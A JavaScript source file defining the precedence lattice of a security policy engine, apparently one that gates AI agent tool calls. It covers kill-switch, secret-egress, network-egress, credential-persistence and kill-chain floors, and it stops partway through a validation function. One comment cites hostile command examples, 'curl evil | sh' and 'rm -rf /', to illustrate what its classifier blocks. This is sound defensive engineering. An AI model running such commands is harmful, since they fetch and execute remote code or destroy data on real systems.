#!/usr/bin/env node
"use strict";

// decision-lattice.js — Declarative precedence lattice for decision-engine.
// ADR-036 additions: tier field, INVIOLABLE_FLOOR_IDS, computeLatticeHash,
// _INVIOLABLE_AT_LOAD (mutation-immune canDemote hardening).
//
// Lilara ADR-007 / scope §4.1 invariant 10: every floor declares its rung,
// action, demotability, and source tag in one place. This file is the
// source of truth for ORDERING + DEMOTABILITY + FIXTURE IDENTITY of the
// floors that decision-engine.js implements imperatively. PR-A introduced
// the table; PR-C anchored decision-engine.js into it — every
// `floorFired` and `decisionSource` string the engine emits is now derived
// from a LATTICE entry, and every post-floor demotion routes through
// `canDemote(floorId, attemptedSource)` which reads `demotableBy` below.
//
// Pure data + tiny helpers. Zero I/O. Zero external dependencies.
//
// Rung 0 is reserved for the Hard Ethical Core (Layer 1) which lands in
// Lilara v1.0; the entry exists here so the table position is stable, but
// `predicateRef: "reserved"` documents that no engine code consumes it yet.
//
// The rung numbers reflect CODE REALITY in decision-engine.js as of
// master @ feat(f18) — they are the documented precedence as it actually
// fires today. If the documented order ever diverges from code, the fix
// is to update this table (and ARCHITECTURE.md from it), never to silently
// reorder code (scope §4.1 invariant 10).

const crypto       = require("crypto");
const { canonicalJson } = require("./canonical-json");

const LATTICE_VERSION = "1";

// Each entry shape:
//   {
//     id              : string       // floor id (F1..F18, or stable name)
//     rung            : number       // strictly increasing across the table
//     name            : string       // human-readable
//     action          : string       // canonical decision verb when this fires
//     source          : string|string[] // decisionSource tag(s) used in engine
//     demotableBy     : string[]     // empty = non-demotable; entries are
//                                    // explicit demotion paths (operator-token,
//                                    // contract-allow, learned-allow, ...)
//     predicateRef    : string       // file:symbol reference (informational)
//     notes           : string|null  // edge-case prose
//   }

const LATTICE = Object.freeze([
  Object.freeze({
    id: "L1",
    rung: 0,
    name: "hard-ethical-core",
    action: "block",
    source: "hard-ethical-core",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "reserved",
    notes: "Reserved for Lilara v1.0 ethical core; not yet engine-baked.",
  }),
  Object.freeze({
    id: "F1",
    rung: 1,
    name: "kill-switch",
    action: "block",
    source: "kill-switch",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(LILARA_KILL_SWITCH)",
    notes: "Fires unconditionally when LILARA_KILL_SWITCH=1.",
  }),
  Object.freeze({
    id: "F2",
    rung: 2,
    name: "contract-hash-mismatch",
    action: "block",
    source: "contract-floor",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(contract.verify)",
    notes: "Strict mode only (LILARA_CONTRACT_REQUIRED=1).",
  }),
  Object.freeze({
    id: "F5",
    rung: 3,
    name: "strict-gated-no-cover",
    action: "block",
    source: "harness-out-of-scope",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(harnessInScope)",
    notes: "Strict mode + gated class + harness not in contract.harnessScope.",
  }),
  Object.freeze({
    id: "F11",
    rung: 4,
    name: "validity-window",
    action: "block",
    source: "contract-floor",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(isInActiveWindow)",
    notes: "Outside activeHoursUtc/activeDays AND payloadClass action != allow.",
  }),
  Object.freeze({
    id: "F12",
    rung: 5,
    name: "mcp-deny",
    action: "block",
    source: "contract-floor",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(getMcpPolicy)",
    notes: "scopes.mcp[<server>] = 'block'.",
  }),
  Object.freeze({
    id: "F13",
    rung: 6,
    name: "skill-deny",
    action: "block",
    source: "contract-floor",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(getSkillPolicy)",
    notes: "scopes.skills[<name>] = 'block'.",
  }),
  Object.freeze({
    id: "F14",
    rung: 7,
    name: "budget-exceeded",
    action: "block",
    source: "contract-floor",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(getBudgetLimits)",
    notes: "scopes.budget.maxDestructiveOps or maxExternalBytes hit.",
  }),
  Object.freeze({
    id: "F3",
    rung: 8,
    name: "critical-risk",
    action: "block",
    source: "risk-engine",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(risk.level=='critical')",
    notes: null,
  }),
  Object.freeze({
    id: "F8",
    rung: 9,
    name: "protected-branch",
    action: "require-review",
    source: "risk-engine",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(risk.reasons:protected-branch)",
    notes: "B4: protected-branch require-review is not demotable by contract-allow.",
  }),
  Object.freeze({
    id: "F29",
    rung: 9.5,
    // F29 (ADR-038 0.2.0 Task 5): out-of-scope destructive-delete coordination.
    // Rung 9.5 sits strictly between F8 protected-branch (9) and F4 secret-class-C (10).
    //
    // Without this floor, an out-of-scope `rm -rf` routes to require-tests with no
    // floor name, no recoverability affordance, and no approve-past mechanism —
    // forcing the operator to decide blind, every time, with no undo.
    //
    // GATE: active only when LILARA_DELETE_COORD=1. When off the legacy require-tests
    // arm runs unchanged — replay corpus byte-identical (flag never set by replay-decisions.js).
    //
    // NORTH-STAR: "security must speed up safely" — approve once (mints a scoped
    // destructiveAllow grant), don't re-ask in scope, keep every delete recoverable
    // (consent-approval hook + ADR-013 rail snapshots each approved delete).
    //
    // INVIOLABLE BOUNDARY: F3 (critical-risk) and F14 (budget-exceeded) remain
    // inviolable (demotableBy:[]) and are NOT affected by this floor. F29 only
    // governs the mid-range "high-risk destructive-delete, not catastrophic" case.
    name: "destructive-delete-coord",
    action: "require-review",
    source: ["destructive-delete-coord", "f29-consent-demoted"],
    tier: "demotable",
    demotableBy: ["consent:interactive"],
    predicateRef: "runtime/decision-engine.js:decide(risk.level=high,destructive-delete-pattern,LILARA_DELETE_COORD)",
    notes: "ADR-038: out-of-scope destructive-delete coordination floor. Flag-gated (LILARA_DELETE_COORD=1). Approval mints scoped destructiveAllow grant + takes recoverability snapshot before proceeding. Inert when off — zero replay divergence. F3/F14 remain inviolable.",
  }),
  Object.freeze({
    id: "F4",
    rung: 10,
    name: "secret-class-C",
    action: "block",
    source: ["secret-class-C", "f4-class-c-demoted"],
    // demotableBy: ADR-002 Option B — F4 (this floor) grants a one-shot scoped
    // operator token (LILARA_F4_DEMOTE_TOKEN, scope `class-c-review-demote`) the
    // authority to demote `block` → `require-review`. No other source qualifies
    // except consent:interactive (0.2.0 consent gate — one-shot approval mints
    // and immediately consumes the operator token internally).
    demotableBy: ["operator-token:class-c-review-demote", "consent:interactive"],
    predicateRef: "runtime/decision-engine.js:decide(payloadClass=='C'||scanSecrets); scopes.mcp[server].policy==='allow' suppresses MCP arg scan arm",
    notes: "ADR-002 Option B: demotable to require-review by one-shot scoped operator token. scopes.mcp[server].policy === 'allow' suppresses the MCP arg scan arm for explicitly trusted servers.",
  }),
  Object.freeze({
    id: "F10",
    rung: 11,
    name: "taint-floor",
    action: "require-review",
    source: "taint-floor",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(correlateCommand)",
    notes: "A2: command overlaps recently-read external content (tainted).",
  }),
  Object.freeze({
    id: "F9",
    rung: 12,
    name: "session-risk-floor",
    action: "escalate",
    source: "session-risk-floor",
    // demotableBy: W11 carve-out — contract.scopes.tools.toolAllow / perToolAllow
    // matches grant F9 (this floor) demotion authority over its own `escalate`.
    // Any other contract-allow reason (path/secret/etc) does NOT demote F9.
    demotableBy: ["contract-allow:tool-allow-matched", "contract-allow:tool-allow-tool-scope"],
    predicateRef: "runtime/decision-engine.js:decide(sessionRisk>=3)",
    notes: "W11 carve-out permits escalate→allow demotion via per-tool contract scope.",
  }),
  Object.freeze({
    id: "F6",
    rung: 13,
    name: "posture-strict-no-cover",
    action: "block",
    source: "posture-strict-no-cover",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(trustPosture=='strict'&&isGated)",
    notes: "D26: strict posture only; balanced/relaxed do not fire.",
  }),
  Object.freeze({
    id: "F7",
    rung: 14,
    name: "intent-unknown-strict",
    action: "require-review",
    source: "intent-unknown-strict",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(intent=='unknown'&&trustPosture=='strict')",
    notes: "ADR-001 D: require-review (was block); D26: strict posture only.",
  }),
  Object.freeze({
    id: "F14b",
    rung: 15,
    name: "session-over-duration",
    action: "require-review",
    source: "session-over-duration",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(sessionOverDuration)",
    notes: "D47: asserted AFTER demotion blocks so contract-allow cannot undo it.",
  }),
  Object.freeze({
    id: "F27",
    rung: 15.5,
    // F27 (ADR-036 0.2.0 Task 3): secret-egress-external inviolable hard-stop.
    // Rung 15.5 is intentional and remains strictly increasing per assertOrdered():
    // F14b (15) < F27 (15.5) < F18 (16). Evaluated as a Phase-A early-block
    // BEFORE F18, F4, and the consent grant-suppression block so no consent
    // grant or operator token can demote it.
    //
    // INVIOLABLE: demotableBy:[] — contract allowDomains intentionally ignored;
    // credential material may not leave to ANY external host under this floor.
    //
    // SCOPE LIMIT: single-call only. Staged/cross-call exfil (secret to temp
    // file in call A, egressed in call B) is the F23/ADR-037 seam.
    //
    // COVERAGE BOUND: sees only egress channels network-egress.js recognises
    // (URL-scheme + bare curl/wget). Channels it cannot parse (scp/rsync) won't
    // trip F27 — same fail-direction as F18.
    name: "secret-egress-external",
    action: "block",
    source: "secret-egress-external-denied",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/floor-secret-egress.js:evalSecretEgressFloor",
    notes: "ADR-036: single-call credential/key-class material to external host. Non-demotable. See scope limits and coverage bounds in ADR-036 §Scope Limit.",
  }),
  Object.freeze({
    id: "F18",
    rung: 16,
    // PR-C: name matches what decision-engine writes to `floorFired`
    // ("network-egress"); the longer "-denied" form lives on `source` and is
    // also the buildEarlyBlock reasonCode. getRungByName("network-egress")
    // must resolve so the journal annotates rung=16 on F18 hits.
    name: "network-egress",
    action: "block",
    source: "network-egress-denied",
    // 0.2.0: consent:interactive allows an operator to approve a specific
    // egress target via the interactive TTY prompt. The approval widens the
    // session scope grant for that host only.
    demotableBy: ["consent:interactive"],
    predicateRef: "runtime/network-egress.js + decision-engine wiring",
    notes: "ADR-005: default-deny network egress when contract.network.egress unmatched.",
  }),
  Object.freeze({
    id: "F18-D007",
    rung: 16.5,
    name: "plaintext-target-blocked",
    action: "block",
    source: "F18-D007",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/network-egress.js:evaluate(plaintext-target-blocked)",
    notes: "D-007: default-deny plaintext http:// outbound; opt-out via scopes.network.allowPlaintext=true. Loopback exempt.",
  }),
  Object.freeze({
    id: "F15",
    rung: 17,
    // PR-C: name matches what decision-engine writes to `floorFired`
    // ("execution-envelope"); the "-diverged" form lives on `source`.
    name: "execution-envelope",
    action: "block",
    source: "execution-envelope-diverged",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/envelope.js + decision-engine wiring",
    notes: "ADR-003 B: pre-exec re-check on critical writes; envelope hash divergence = block.",
  }),
  Object.freeze({
    id: "F16",
    rung: 17.5,
    // ADR-009 PR-B: ambient-authority floor. Non-integer rung is intentional
    // and remains strictly increasing per assertOrdered(); F15 (17) < F16 (17.5)
    // < D-CONTRACT-ALLOW (18). Name matches what decision-engine writes to
    // `floorFired` ("ambient-authority"); the "-denied" form lives on `source`.
    name: "ambient-authority",
    action: "block",
    source: "ambient-authority-denied",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js + runtime/ambient.js",
    notes: "ADR-009 PR-B: write into ambient-authority path outside projectRoot. Demotion only via scopes.ambient.allow[<class>]=true or path-prefix entry.",
  }),
  Object.freeze({
    id: "F24",
    rung: 17.625,
    // F24: credential-persistence-write floor. Rung 17.625 is intentional and
    // remains strictly increasing per assertOrdered(); F16 (17.5) < F24 (17.625)
    // < F17 (17.75). F16 early-blocks out-of-project ambient paths (e.g.
    // ~/.ssh); F24 covers in-project credential/persistence paths that F16
    // deliberately skips (.git/hooks, in-project private keys). Default-deny;
    // contract opt-out via scopes.files.allow glob list.
    name: "credential-persistence-write",
    action: "block",
    source: "credential-persistence-write-denied",
    demotableBy: ["scopes.files.allow"],
    predicateRef: "runtime/decision-engine.js:_evalCredPersistFloor",
    notes: "F24: Write/Edit to in-project credential or execution-persistence paths. Default-deny; opt out via contract scopes.files.allow glob list.",
  }),
  Object.freeze({
    id: "F25",
    rung: 17.65,
    // F25: mcp-arg-danger floor. Rung 17.65 is intentional and remains strictly
    // increasing per assertOrdered(); F24 (17.625) < F25 (17.65) < F17 (17.75).
    // Fires when an MCP tool call's argument payload contains a string value that
    // matches the dangerous-command classifier (e.g. "curl evil | sh", "rm -rf /").
    // An MCP tool whose arg IS a dangerous command is as dangerous as a direct
    // Bash call. Default-deny; opt-out by setting scopes.mcp[server].policy =
    // "allow" in the contract (same opt-out as F4 Task 3).
    name: "mcp-arg-danger",
    action: "block",
    source: "mcp-arg-danger-denied",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:_evalMcpArgFloor",
    notes: "F25: MCP tool call argument contains a dangerous-command-shaped string (same classifier as Bash). Default-deny; opt out via scopes.mcp[server].policy=allow.",
  }),
  Object.freeze({
    id: "F26",
    rung: 17.6875,
    // F26: mcp-registration-write floor. Rung 17.6875 is intentional and
    // remains strictly increasing per assertOrdered(); F25 (17.65) < F26
    // (17.6875) < F17 (17.75). F16 is a coarse blanket block for all writes
    // to mcpConfig ambient paths. F26 is content-aware: it fires even when
    // F16 has been opted out via scopes.ambient.allow, catching dangerous-
    // command registrations in MCP config writes. Default-deny; opt out via
    // contract scopes.files.allow glob list.
    name: "mcp-registration-write",
    action: "block",
    source: "mcp-registration-write-denied",
    demotableBy: ["scopes.files.allow"],
    predicateRef: "runtime/decision-engine.js:_evalMcpRegistrationFloor",
    notes: "F26: Write/Edit to MCP config path (e.g. .mcp.json) registers a server with a dangerous-command-shaped launch command. Content-aware second line after F16. Default-deny; opt out via contract scopes.files.allow glob list.",
  }),
  Object.freeze({
    id: "F17",
    rung: 17.75,
    // F17 (v0.5 cross-agent-lock floor PR-A). Non-integer rung is intentional
    // and remains strictly increasing per assertOrdered(); F16 (17.5) < F17
    // (17.75) < F19 (17.875) < D-CONTRACT-ALLOW (18). Name matches what
    // decision-engine writes to `floorFired` ("cross-agent-lock"); the
    // "-denied" form lives on `source`. Non-demotable: an active lock from
    // another agent is a hard floor, and a malformed lock file fails closed
    // for write-like calls (no contract scope can re-permit a write the
    // runtime cannot safely characterize).
    name: "cross-agent-lock",
    action: "block",
    source: "cross-agent-lock-denied",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js + runtime/cross-agent-lock.js",
    notes: "F17: write-like call targets a path/project held by another live agent's lock. Fail-closed on malformed lock state.",
  }),
  Object.freeze({
    id: "F19",
    rung: 17.875,
    // F19 (v0.5 Stage D — ADR-010): output-channel-exfiltration guard. Sits
    // immediately after F17 (cross-agent-lock @ 17.75) and before the
    // contract-allow demotion rung (18) so contract scopes cannot demote it
    // by accident. Rung 17.875 keeps the table strictly-increasing per
    // assertOrdered() — F17 (17.75) < F19 (17.875) < D-CONTRACT-ALLOW (18).
    //
    // Severity model:
    //   - `confirmed`   matches → block (non-demotable).
    //   - `suspicious`  matches → require-review (demotable only by a
    //                  one-shot scoped operator token bound to the
    //                  `output-exfil-review-demote` scope — same shape as
    //                  the F4 demotion path).
    // No contract-allow / learned-allow path applies; both are precluded by
    // demotableBy below. The single demotion sentinel encodes the
    // severity-gated rule: F19 only demotes on `suspicious` matches.
    name: "output-channel-exfiltration",
    action: "block",
    // source is array-shaped: index 0 is the baseline reason code emitted on
    // confirmed / suspicious / compensating fires; index 1 is the variant
    // tag used when a one-shot scoped operator token (scope
    // `output-exfil-review-demote`) demotes a suspicious match to allow.
    // Matches the F4 pattern so check-no-implicit-demotion stays anchored.
    source: ["output-exfil-denied", "f19-demoted"],
    // consent:interactive mints+consumes the operator token internally (one-shot;
    // does NOT widen the scope grant, re-asks on next exfil detection).
    demotableBy: ["operator-token-suspicious-only", "consent:interactive"],
    predicateRef: "runtime/decision-engine.js + runtime/output-exfil.js",
    notes: "F19: output-channel exfiltration. Confirmed matches block; suspicious matches route to require-review and are demotable only by a one-shot scoped operator token (operator-token-suspicious-only). Adapter manifests must declare outputChannelObservability and, for not-observed channels, a compensatingRestriction; default-deny otherwise.",
  }),
  // --- demotion / promotion rungs (not floors; recorded for completeness) ---
  Object.freeze({
    id: "D-CONTRACT-ALLOW",
    rung: 18,
    name: "contract-allow",
    action: "demote-baseline",
    source: ["contract-allow", "contract-allow-tool-scope"],
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(scopeMatch)",
    notes: "Demotes baseline only; never demotes a floor.",
  }),
  Object.freeze({
    id: "D-CONSENT",
    rung: 18.25,
    // Demotion entry for the 0.2.0 scope-based consent gate. Sits between
    // D-CONTRACT-ALLOW (18) and F20 (18.5) so it is recorded after contract
    // scope is checked but before the F20 late-override applies.
    //
    // This is a DEMOTION SOURCE, not a floor. It does not fire independently;
    // rather, when an active session consent grant covers the action, decide()
    // sets action="allow" and source=D-CONSENT.source so the receipt clearly
    // attributes the demotion to a human consent approval.
    //
    // The source tag "consent-allow" is anchored here so check-no-implicit-
    // demotion.sh can verify that every `source = "consent-allow"` assignment
    // in decision-engine.js references a LATTICE entry.
    name: "consent-allow",
    action: "demote-floor",
    source: "consent-allow",
    demotableBy: [],
    predicateRef: "runtime/floor-consent.js + runtime/consent/grant-store.js",
    notes: "0.2.0 consent gate: human-approved session grant covers this action. Source tag used when evalConsentFloor returns inScope:true and decide() demotes to allow.",
  }),
  Object.freeze({
    id: "F20",
    rung: 18.5,
    // F20 (v0.5 Stage D wave 2 — ADR-012): change-intent drift. Compares the
    // declared-envelope (envelope.declaredIntent) against the canonical Action
    // IR built by adapters. Out-of-intent actuals fire F20 with one of six
    // drift classes (file-write/delete/command/command-class/network-host/
    // policy-edit out-of-scope).
    //
    // Rung 18.5 sits AFTER D-CONTRACT-ALLOW (18) and BEFORE D-LEARNED-ALLOW
    // (19). This is intentional: the brief specifies "rung 18.5" and the
    // chosen position documents that contract-allow cannot demote F20 at
    // `high` severity, and that the engine calls diffEnvelopeVsIr between
    // F19's preview-action assignment and the contract-allow demotion block
    // (the action override is applied later, after F14b, so contract-allow /
    // auto-allow-once / trajectory-nudge cannot silently undo it).
    //
    // Severity model:
    //   - `high`    → block (non-demotable by learned-allow or contract-allow).
    //                ≥2 drift classes OR any policy-edit drift OR
    //                ir.destructive=true + drift.
    //   - `medium`  → require-review, demotable only via a one-shot scoped
    //                operator token bound to `change-intent-drift-medium`.
    //   - `low`     → receipt-only marker (no decision change).
    //   - `none` /  → no decision change (fail-open helper exception still
    //   fail-open    journals a degraded-mode marker; engine never throws).
    //
    // source[0] is the baseline reason code; source[1] is the variant tag
    // used when an operator token demotes a `medium` match to allow.
    name: "change-intent-drift",
    action: "block",
    source: ["change-intent-drift", "f20-demoted"],
    // consent:interactive for medium-severity drift only (high stays block).
    // Approval widens the session scope grant for the drifted intent.
    demotableBy: ["operator-token-medium-only", "consent:interactive"],
    predicateRef: "runtime/change-intent.js + decision-engine wiring",
    notes: "F20: declared-envelope vs Action-IR drift. high blocks; medium routes to require-review (demotable only by a one-shot scoped operator token bound to change-intent-drift-medium); low is receipt-only. Fail-open on helper exception.",
  }),
  Object.freeze({
    id: "F23",
    rung: 18.6,
    // F23 (ADR-017): cross-call data-flow / kill-chain detection. Rung 18.6 sits
    // after F20 (change-intent-drift @ 18.5) and before F21 (compaction-survival
    // @ 18.7). The action override is applied via the late-override preview
    // pattern so D-CONTRACT-ALLOW (18) / D-LEARNED-ALLOW (19) cannot undo it.
    //
    // Non-demotable: kill chains are classified by multi-step evidence (content
    // token-hash overlap OR structural file reference); no operator token or
    // contract scope can downgrade a detected chain.
    //
    // Ships in observe-only mode by default (LILARA_KILL_CHAIN_ENFORCE=1 to
    // enforce). Observe mode adds only the killChain receipt field — action,
    // source, and floorFired are unchanged.
    //
    // See references/adr-017-provenance-graph.md for chain shapes, evidence
    // bar, FP mitigations, and harness coverage limitations.
    name: "data-flow-kill-chain",
    action: "escalate",
    source: ["data-flow-kill-chain", "data-flow-kill-chain-detected"],
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/provenance-graph.js:evaluate",
    notes: "ADR-017: multi-step kill-chain. staged-exfil→block; injection-to-exec+persistence→escalate. Observe-only by default; LILARA_KILL_CHAIN_ENFORCE=1 to enforce.",
  }),
  Object.freeze({
    id: "F28",
    rung: 18.65,
    // F28 (ADR-037 0.2.0 Task 4): staged / cross-call credential exfiltration
    // detection. Rung 18.65 sits strictly between F23 (18.6) and F21 (18.7).
    //
    // ESCALATE → consent rationale: ADR-036 invariant #6 states inviolable
    // floors decide on single-call action-evidence only. Cross-call taint state
    // makes this explicitly escalate-not-inviolable. For a credential chain,
    // F28 supersedes F23's block and routes to stop-and-ask with REAL args.
    //
    // Bespoke (file, host) grant — NOT the general scopesMatch engine (which
    // has no network branch). Approved scope is silent; file or host change
    // re-asks. Consent UX requires LILARA_CONSENT=interactive.
    //
    // Ships with detection off by default (LILARA_TAINT_EGRESS=1 to enable).
    // Inert (no provenanceGraph injection) → zero replay divergence when off.
    //
    // TAINT CLASS: F27-narrow credential signals (CRED_PATH_PATTERNS + inline
    // secret scan). Broader F23 "sensitive" class is NOT in scope — F23 still
    // owns it with the inviolable block. ADR-037 §Scope Limit.
    name: "taint-egress-consent",
    action: "escalate",
    source: ["taint-egress-consent", "credential-staged-exfil-detected"],
    tier: "demotable",
    demotableBy: ["consent:interactive"],
    predicateRef: "runtime/floor-taint-egress.js:evalTaintEgressFloor",
    notes: "ADR-037: cross-call credential taint → external egress. ESCALATE → consent-required. Active only when LILARA_TAINT_EGRESS=1. Inert (no graph injection) otherwise — zero replay divergence. Bespoke (host, filePathHash) grant — re-asks only on scope change.",
  }),
  Object.freeze({
    id: "F21",
    rung: 18.7,
    name: "compaction-survival",
    action: "warn",
    source: "compaction-survival-detected",
    tier: "inviolable",
    demotableBy: [],
    predicateRef: "runtime/compaction-survival.js + runtime/post-adapter-factory.js",
    notes: "ADR-016: PostToolUse pattern scan for prompt-injection payloads in Read/WebFetch/WebSearch/Fetch/mcp/Browser results. Detection-only warn floor; enforcement via F10 taint correlation on next PreToolUse.",
  }),
  Object.freeze({
    id: "D-LEARNED-ALLOW",
    rung: 19,
    name: "learned-allow",
    action: "demote-narrow",
    source: "learned-allow",
    demotableBy: [],
    predicateRef: "runtime/policy-store.js:isLearnedAllowed",
    notes: "destructive-delete-pattern only; cannot demote any floor.",
  }),
  Object.freeze({
    id: "D-AUTO-ALLOW-ONCE",
    rung: 20,
    name: "auto-allow-once",
    action: "demote-narrow",
    source: "auto-allow-once",
    demotableBy: [],
    predicateRef: "runtime/policy-store.js:hasAutoAllowOnce",
    notes: "Consumed only when actually needed; cannot demote floors.",
  }),
  Object.freeze({
    id: "P-TRAJECTORY-NUDGE",
    rung: 21,
    name: "trajectory-nudge",
    action: "promote",
    source: "trajectory-nudge",
    demotableBy: [],
    predicateRef: "runtime/decision-engine.js:decide(trajectory)",
    notes: "Promote-only; exempts contract-allow + learned-allow + floor-derived sources.",
  }),
]);

// ---------------------------------------------------------------------------
// ADR-036: Inviolable tier — derived from demotableBy:[], not hand-maintained.
//
// INVIOLABLE_FLOOR_IDS is computed at module load from the frozen LATTICE so
// it can never drift from the actual demotableBy values. Floor entries only
// (L- and F-prefixed); demotion/promotion rungs (D-* / P-*) are excluded.
// ---------------------------------------------------------------------------
const INVIOLABLE_FLOOR_IDS = Object.freeze(
  LATTICE
    .filter(
      (e) =>
        (e.id[0] === "F" || e.id[0] === "L") &&
        Array.isArray(e.demotableBy) &&
        e.demotableBy.length === 0
    )
    .map((e) => e.id)
);

// _INVIOLABLE_AT_LOAD — load-time Set of inviolable floor IDs for O(1)
// mutation-immune check in canDemote. Populated from the frozen LATTICE so
// no in-process mutation of _BY_ID can bypass it. NEVER reassign this const.
const _INVIOLABLE_AT_LOAD = new Set(INVIOLABLE_FLOOR_IDS);

function isInviolable(floorId) {
  const e = typeof floorId === "string" ? _BY_ID[floorId] : null;
  return !!e && Array.isArray(e.demotableBy) && e.demotableBy.length === 0;
}

// computeLatticeHash() — deterministic sha256 over a projection of every
// floor entry's security-load-bearing fields: id, rung, action, sorted
// demotableBy, and tier (derived when absent). Uses the same canonical-json
// + sha256: idiom as contractHash (contract.js) and irHash (action-ir.js).
//
// What is covered: any change to any floor's id, rung, action, demotableBy,
// or tier causes the hash to change. Cosmetic fields (notes, predicateRef)
// are intentionally excluded so docs-only edits don't churn the baseline.
//
// Call from scripts/check-inviolable-tier.sh to compare against the committed
// baseline in artifacts/lattice-baseline.sha256. NEVER call from decide()
// (adds I/O, breaks byte-identical replay). Runtime protection is provided
// by _INVIOLABLE_AT_LOAD + the canDemote mutation-immune guard below.
function computeLatticeHash() {
  const floors = LATTICE.map((e) => ({
    id:          e.id,
    rung:        e.rung,
    action:      e.action,
    demotableBy: Array.isArray(e.demotableBy) ? e.demotableBy.slice().sort() : [],
    tier:        e.tier || (Array.isArray(e.demotableBy) && e.demotableBy.length === 0
                   ? "inviolable"
                   : "demotable"),
  }));
  const canon = canonicalJson({ version: LATTICE_VERSION, floors });
  return "sha256:" + crypto.createHash("sha256").update(canon, "utf8").digest("hex");
}

// ---------------------------------------------------------------------------
// Build a quick id → entry index for O(1) lookup. Frozen.
// ---------------------------------------------------------------------------
const _BY_ID = Object.freeze(
  LATTICE.reduce((acc, entry) => {
    acc[entry.id] = entry;
    return acc;
  }, Object.create(null))
);

// Build a name → entry index. Floor names (e.g. "secret-class-C", "taint-floor")
// are what decision-engine.js writes into floorFired today; the lookup lets
// PR-B annotate journal entries with rung without first refactoring the engine
// to use lattice ids (PR-C scope).
const _BY_NAME = Object.freeze(
  LATTICE.reduce((acc, entry) => {
    if (typeof entry.name === "string" && entry.name.length > 0) {
      acc[entry.name] = entry;
    }
    return acc;
  }, Object.create(null))
);

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function getEntry(id) {
  if (typeof id !== "string") return null;
  return _BY_ID[id] || null;
}

function getEntryByName(name) {
  if (typeof name !== "string") return null;
  return _BY_NAME[name] || null;
}

function getRung(id) {
  const entry = getEntry(id);
  return entry ? entry.rung : null;
}

// getRungByName(floorName) — convenience for journal annotation. floorName is
// the human-readable name decision-engine writes into floorFired (e.g.
// "taint-floor", "secret-class-C"). Returns null when no entry matches; PR-B
// callers must tolerate null so unmapped names (e.g. "secret-class-C-demoted")
// don't break journal append.
function getRungByName(floorName) {
  const entry = getEntryByName(floorName);
  return entry ? entry.rung : null;
}

function getFloor(id) {
  // Convenience: only "floor" rungs (engine-baked, not demotion/promotion).
  // Floors are ids starting with "L" or "F".
  const entry = getEntry(id);
  if (!entry) return null;
  if (entry.id[0] !== "F" && entry.id[0] !== "L") return null;
  return entry;
}

function listFloors() {
  return LATTICE.filter((e) => e.id[0] === "F" || e.id[0] === "L");
}

// canDemote(currentFloorId, attemptedSource) — PR-C demotion guard. Returns
// true only when `attemptedSource` is explicitly listed in the floor's
// `demotableBy` array; an unknown floorId or an unlisted source returns
// false. decision-engine.js routes every post-floor demotion through this
// helper so no future drift can silently bypass a floor by reassigning
// `action` / `source` directly. `currentFloorId` is the LATTICE `id`
// (e.g. "F4"), not the human-readable name written into floorFired.
function canDemote(currentFloorId, attemptedSource) {
  if (typeof currentFloorId !== "string" || currentFloorId.length === 0) return false;
  if (typeof attemptedSource !== "string" || attemptedSource.length === 0) return false;
  // ADR-036: mutation-immune inviolable guard. _INVIOLABLE_AT_LOAD is a Set
  // built from the frozen LATTICE at module load time, so in-process mutation
  // of _BY_ID cannot bypass this check. This is a provable no-op on current
  // behavior (every inviolable member already returned false via the empty
  // demotableBy branch); it adds only immunity against code-path abuse.
  if (_INVIOLABLE_AT_LOAD.has(currentFloorId)) return false;
  const entry = _BY_ID[currentFloorId];
  if (!entry) return false;
  const list = entry.demotableBy;
  if (!Array.isArray(list) || list.length === 0) return false;
  for (let i = 0; i < list.length; i++) {
    if (list[i] === attemptedSource) return true;
  }
  return false;
}

// enforcementFor(action, floorFired) — pure helper that maps a decision's
// action verb + fired floor name to the correct enforcementAction value.
// Used by early-receipt-builder.js (buildEarlyBlock / buildEarlyReview) and
// decision-engine.js to centralise the mapping in one lattice-grounded place.
//
// Rules:
//   - Non-blocking actions (allow, warn, route, modify) → "warn"
//   - Blocking action + floor is consent-eligible (floor's demotableBy contains
//     "consent:interactive") → "consent-required"
//   - Blocking action + no/unknown floor, or floor is non-demotable → "block"
//
// This is the only correct way to decide whether an action becomes "consent-
// required" vs hard "block". Never inline this logic — always call this function.
const _BLOCKING_ACTIONS = new Set(["block", "escalate", "require-review", "require-tests"]);
const _CONSENT_SOURCE   = "consent:interactive";

function enforcementFor(action, floorFired) {
  if (!_BLOCKING_ACTIONS.has(action)) return "warn";
  if (!floorFired) return "block";
  const entry = _BY_NAME[floorFired];
  if (!entry) return "block"; // unknown floor name → fail-safe hard block
  if (canDemote(entry.id, _CONSENT_SOURCE)) return "consent-required";
  return "block";
}

// assertOrdered() — enforces the table invariants. Throws Error on first
// violation. Used by tests + by the lattice-ordering CI script. Cheap to
// call; safe to invoke at module load when LILARA_LATTICE_SELFTEST=1.
function assertOrdered(table) {
  const t = table || LATTICE;
  if (!Array.isArray(t)) {
    throw new Error("decision-lattice: table is not an array");
  }
  const seenIds = Object.create(null);
  let prevRung = -Infinity;
